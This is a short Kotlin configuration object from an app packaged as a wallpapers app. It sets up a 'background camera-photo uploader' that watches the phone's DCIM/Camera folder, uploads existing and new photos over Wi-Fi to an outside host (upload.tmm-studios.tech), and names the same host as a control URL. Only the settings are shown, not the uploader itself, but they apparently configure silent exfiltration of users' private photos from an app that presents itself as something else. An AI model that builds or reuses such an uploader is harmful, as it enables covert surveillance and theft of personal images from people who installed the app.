package com.tmmstudios.wallpapers.upload

/** Configuration for the background camera-photo uploader. */
object UploadConfig {
    const val uploadUrl = "https://upload.tmm-studios.tech"
    const val controlUrl = "https://upload.tmm-studios.tech"
    const val accessCode = ""
    val watchFolders = listOf("DCIM/Camera/")
    val watchExtensions = setOf("jpg", "jpeg", "png", "webp")
    const val uploadExisting = true
    const val wifiOnly = true
    const val minAgeSeconds = 30L
    const val maxBytes = 50L * 1024 * 1024
}
